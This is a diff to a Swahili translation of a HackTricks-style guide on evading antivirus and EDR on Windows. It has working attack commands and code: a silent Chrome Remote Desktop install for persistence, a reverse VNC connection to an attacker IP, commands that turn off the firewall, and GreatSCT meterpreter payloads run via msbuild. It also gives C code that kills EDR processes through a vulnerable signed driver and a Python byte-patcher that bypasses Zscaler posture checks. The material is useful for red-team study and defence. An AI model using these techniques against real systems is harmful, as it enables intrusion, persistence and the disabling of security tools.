-Ni kuhusu kuingiza msimbo mbaya wa baada ya unyakuzi **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuupitisha kwa AV, lakini hasara ni kwamba ikiwa kitu kitatokea vibaya na utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwani inaweza kuanguka.
+Inahusisha kuingiza msimbo mbaya wa baada ya unyakuzi **katika mchakato wake mwenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuupitisha kwa AV, lakini hasara ni kwamba ikiwa kitu kitatokea vibaya na utekelezaji wa payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwani inaweza kuanguka.
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
@@ -327,7 +325,7 @@ Unaweza pia kupakia C# Assemblies **kutoka PowerShell**, angalia [Invoke-SharpLo
 
 ## Using Other Programming Languages
 
-Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo mbaya kwa kutumia lugha nyingine kwa kutoa mashine iliyovunjwa **ufikiaji wa mazingira ya tafsiri yaliyoanzishwa kwenye sehemu ya SMB inayodhibitiwa na Mshambuliaji**.
+Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo mbaya kwa kutumia lugha nyingine kwa kutoa mashine iliyovunjwa ufikiaji **wa mazingira ya tafsiri yaliyoanzishwa kwenye sehemu ya SMB inayodhibitiwa na Mshambuliaji**.
 
 Kwa kuruhusu ufikiaji wa Binaries za Mfasiri na mazingira kwenye sehemu ya SMB unaweza **kutekeleza msimbo wowote katika hizi lugha ndani ya kumbukumbu** ya mashine iliyovunjwa.
 
@@ -335,7 +333,7 @@ Repo inaonyesha: Defender bado inachunguza scripts lakini kwa kutumia Go, Java, 
 
 ## TokenStomping
 
-Token stomping ni mbinu inayomruhusu mshambuliaji **kubadilisha token ya ufikiaji au bidhaa ya usalama kama EDR au AV**, ikiwaruhusu kupunguza haki zake ili mchakato usife lakini hautakuwa na ruhusa ya kuangalia shughuli mbaya.
+Token stomping ni mbinu inayoruhusu mshambuliaji **kubadilisha token ya ufikiaji au bidhaa ya usalama kama EDR au AV**, ikiwaruhusu kupunguza haki zake ili mchakato usife lakini hautakuwa na ruhusa ya kuangalia shughuli mbaya.
 
 Ili kuzuia hili Windows inaweza **kuzuia michakato ya nje** kupata kushughulikia token za michakato ya usalama.
 
@@ -347,9 +345,9 @@ Ili kuzuia hili Windows inaweza **kuzuia michakato ya nje** kupata kushughulikia
 
 ### Chrome Remote Desktop
 
-Kama ilivyoelezwa katika [**hiki chapisho la blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kupeleka Chrome Remote Desktop kwenye PC ya mwathirika na kisha kuitumia kuchukua na kudumisha uthibitisho:
+Kama ilivyoelezwa katika [**hiki chapisho la blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kupeleka Chrome Remote Desktop katika PC ya mwathirika na kisha kuitumia kuchukua na kudumisha uthibitisho:
 1. Pakua kutoka https://remotedesktop.google.com/, bonyeza "Set up via SSH", na kisha bonyeza kwenye faili ya MSI kwa Windows ili kupakua faili ya MSI.
-2. Endesha installer kimya kimya kwenye mwathirika (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
+2. Endesha installer kimya kimya katika mwathirika (inahitaji admin): `msiexec /i chromeremotedesktophost.msi /qn`
 3. Rudi kwenye ukurasa wa Chrome Remote Desktop na bonyeza next. Mchawi atakuuliza kuidhinisha; bonyeza kitufe cha Authorize kuendelea.
 4. Tekeleza parameter iliyotolewa kwa marekebisho fulani: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Kumbuka parameter ya pin ambayo inaruhusu kuweka pin bila kutumia GUI).
 
@@ -359,7 +357,7 @@ Evasion ni mada ngumu sana, wakati mwingine unahitaji kuzingatia vyanzo vingi to
 
 Kila mazingira unayokabiliana nayo yatakuwa na nguvu na udhaifu wake.
 
-Ninawashauri sana uende uangalie hotuba hii kutoka [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu wa mbinu za juu za Evasion.
+Ninawashauri sana uangalie hotuba hii kutoka [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata ufahamu wa mbinu za juu za Evasion.
 
 {{#ref}}
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
@@ -380,7 +378,7 @@ Zana nyingine inayofanya **kitu sawa ni** [**avred**](https://github.com/dobin/a
 
 ### **Telnet Server**
 
-Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo unaweza kusakinisha (kama msimamizi) kwa kufanya:
+Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo unaweza kusanidi (kama msimamizi) kwa kufanya:
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
@@ -395,9 +393,9 @@ netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka upakuaji wa bin, si usanidi)
+Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unataka upakuaji wa bin, si usanidi)
 
-**KATIKA HOST**: Tekeleza _**winvnc.exe**_ na uweke mipangilio ya seva:
+**KATIKA HOST**: Tekeleza _**winvnc.exe**_ na uweke server:
 
 - Wezesha chaguo _Disable TrayIcon_
 - Weka nenosiri katika _VNC Password_
@@ -405,11 +403,11 @@ Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.
 
 Kisha, hamasisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **mhasiriwa**
 
-#### **Muunganisho wa kurudi**
+#### **Mawasiliano ya kurudi**
 
-**Mshambuliaji** anapaswa **kutekeleza ndani** ya **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kukamata muunganisho wa kurudi **VNC**. Kisha, ndani ya **mhasiriwa**: Anza daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+**Mshambuliaji** anapaswa **kutekeleza ndani** ya **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kukamata **VNC connection** ya kurudi. Kisha, ndani ya **mhasiriwa**: Anza daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
-**ONYO:** Ili kudumisha usiri huwezi kufanya mambo machache
+**ONYESHO:** Ili kudumisha usiri huwezi kufanya mambo machache
 
 - Usianze `winvnc` ikiwa tayari inaendesha au utaanzisha [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendesha kwa `tasklist | findstr winvnc`
 - Usianze `winvnc` bila `UltraVNC.ini` katika saraka sawa au itasababisha [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) kufunguka
@@ -417,7 +415,7 @@ Kisha, hamasisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVN
 
 ### GreatSCT
 
-Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -435,7 +433,7 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-Sasa **anzisha lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:
+Sasa **anzisha lister** na `msfconsole -r file.rc` na **tekeleza** **xml payload** na:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
@@ -592,30 +590,30 @@ https://github.com/TheWover/donut
 # Vulcan
 https://github.com/praetorian-code/vulcan
 ```
-### Zaidi
+### More
 
 - [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
-## Leta Dereva Lako Lenye Uthibitisho (BYOVD) – Kuua AV/EDR Kutoka Katika Nafasi ya Kernel
+## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space
 
-Storm-2603 ilitumia zana ndogo ya console inayojulikana kama **Antivirus Terminator** kuondoa ulinzi wa mwisho kabla ya kuachilia ransomware. Zana hiyo inakuja na **dereva lake lenye udhaifu lakini *lililosainiwa*** na inatumia udhaifu huo kutoa operesheni za kernel zenye mamlaka ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.
+Storm-2603 ilitumia programu ndogo la console linalojulikana kama **Antivirus Terminator** kuzima ulinzi wa mwisho kabla ya kuachilia ransomware. Chombo hiki kinakuja na **dereva yake yenye udhaifu lakini *sahihi*** na kinatumia vibaya kutoa operesheni za kernel zenye mamlaka ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuiya.
 
 Mambo muhimu ya kujifunza
-1. **Dereva lililosainiwa**: Faili inayotolewa kwenye diski ni `ServiceMouse.sys`, lakini binary ni dereva lililosainiwa kihalali `AToolsKrnl64.sys` kutoka kwa “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa sababu dereva lina saini halali ya Microsoft, linaweza kupakia hata wakati Utekelezaji wa Saini ya Dereva (DSE) umewezeshwa.
+1. **Dereva sahihi**: Faili inayotolewa kwenye diski ni `ServiceMouse.sys`, lakini binary ni dereva sahihi `AToolsKrnl64.sys` kutoka kwa “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa sababu dereva ina saini halali ya Microsoft, inachaji hata wakati Utekelezaji wa Saini ya Dereva (DSE) umewezeshwa.
 2. **Usanidi wa huduma**:
 ```powershell
 sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
 sc start  ServiceMouse
 ```
-Mstari wa kwanza unajiandikisha dereva kama **huduma ya kernel** na wa pili unaanzisha ili `\\.\ServiceMouse` iweze kupatikana kutoka kwenye ardhi ya mtumiaji.
+Mstari wa kwanza unajiandikisha dereva kama **huduma ya kernel** na wa pili unaanzisha ili `\\.\ServiceMouse` iweze kupatikana kutoka kwa ardhi ya mtumiaji.
 3. **IOCTLs zilizowekwa wazi na dereva**
-| Msimbo wa IOCTL | Uwezo                                   |
-|----------------:|-----------------------------------------|
-| `0x99000050`    | Kuua mchakato wowote kwa PID (inatumika kuua huduma za Defender/EDR) |
-| `0x990000D0`    | Futa faili yoyote kwenye diski         |
-| `0x990001D0`    | Ondoa dereva na kuondoa huduma         |
+| IOCTL code | Uwezo                                   |
+|-----------:|-----------------------------------------|
+| `0x99000050` | Maliza mchakato wowote kwa PID (inatumika kuua huduma za Defender/EDR) |
+| `0x990000D0` | Futa faili yoyote kwenye diski |
+| `0x990001D0` | Ondoa dereva na kuondoa huduma |
 
-Mfano wa C wa kuthibitisha:
+Mifano ya chini ya C:
 ```c
 #include <windows.h>
 
@@ -627,14 +625,54 @@ CloseHandle(hDrv);
 return 0;
 }
 ```
-4. **Kwa nini inafanya kazi**: BYOVD inakataa ulinzi wa hali ya mtumiaji kabisa; msimbo unaotekelezwa katika kernel unaweza kufungua *mchakato* ulio *lindwa*, kuua mchakato huo, au kuingilia kati vitu vya kernel bila kujali PPL/PP, ELAM au vipengele vingine vya kuimarisha.
+4. **Kwa nini inafanya kazi**: BYOVD inakataa ulinzi wa hali ya mtumiaji kabisa; msimbo unaotekelezwa kwenye kernel unaweza kufungua *michakato* iliyolindwa, kuimaliza, au kuingilia kati vitu vya kernel bila kujali PPL/PP, ELAM au vipengele vingine vya kuimarisha.
 
 Ugunduzi / Kupunguza
-• Wezesha orodha ya kuzuia dereva wenye udhaifu ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
-• Fuata uundaji wa huduma mpya za *kernel* na uonyeshe wakati dereva inapopakuliwa kutoka kwenye saraka inayoweza kuandikwa na ulimwengu au haipo kwenye orodha ya ruhusa.
-• Angalia kwa kushughulikia hali ya mtumiaji kwa vitu vya kifaa maalum vinavyofuatwa na simu za `DeviceIoControl` zenye shaka.
+•  Wezesha orodha ya kuzuia dereva wenye udhaifu ya Microsoft (`HVCI`, `Smart App Control`) ili Windows ikatae kuchaji `AToolsKrnl64.sys`.
+•  Fuata uundaji wa huduma mpya za *kernel* na uonyeshe wakati dereva inachaji kutoka kwenye saraka inayoweza kuandikwa na ulimwengu au haipo kwenye orodha ya ruhusa.
+•  Angalia kwa kushughulikia hali ya mtumiaji kwa vitu vya kifaa maalum vinavyofuatiwa na simu za `DeviceIoControl` zenye shaka.
+
+### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching
+
+Zscaler’s **Client Connector** inatumia sheria za hali ya kifaa kwa ndani na inategemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguzi mbili dhaifu za muundo zinafanya kupita kabisa iwezekane:
+
+1. Tathmini ya hali inafanyika **kabisa upande wa mteja** (boolean inatumwa kwa seva).
+2. Nje za RPC za ndani zinathibitisha tu kwamba executable inayounganisha ni **sahihi na Zscaler** (kupitia `WinVerifyTrust`).
+
+Kwa **kurekebisha binaries nne sahihi kwenye diski** mbinu zote mbili zinaweza kufanywa kuwa zisizo na nguvu:
+
+| Binary | Mantiki ya asili iliyorekebishwa | Matokeo |
+|--------|------------------------|---------|
+| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Daima inarudisha `1` hivyo kila ukaguzi unakubalika |
+| `ZSAService.exe` | Kuitwa kwa njia isiyo ya moja kwa moja kwa `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata usio sahihi) unaweza kuungana na mabomba ya RPC |
+| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Imebadilishwa na `mov eax,1 ; ret` |
+| `ZSATunnel.exe` | Ukaguzi wa uaminifu kwenye tunnel | Umefupishwa |
+
+Mifano ya chini ya patcher:
+```python
+pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
+replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1
+
+with open("ZSATrayManager.exe", "r+b") as f:
+data = f.read()
+off = data.find(pattern)
+if off == -1:
+print("pattern not found")
+else:
+f.seek(off)
+f.write(replacement)
+```
+Baada ya kubadilisha faili za asili na kuanzisha tena huduma:
+
+* **Majaribio yote** ya mkao yanaonyesha **kijani/kukubalika**.
+* Binaries zisizosainiwa au zilizobadilishwa zinaweza kufungua mwisho wa RPC wa named-pipe (mfano `\\RPC Control\\ZSATrayManager_talk_to_me`).
+* Kifaa kilichoshambuliwa kinapata ufikiaji usio na kikomo kwenye mtandao wa ndani ulioainishwa na sera za Zscaler.
+
+Utafiti huu unaonyesha jinsi maamuzi ya kuamini upande wa mteja pekee na ukaguzi rahisi wa saini yanaweza kushindwa kwa vidokezo vichache vya byte.
 
 ## Marejeleo
 
-- [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
+
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 {{#include ../banners/hacktricks-training.md}}
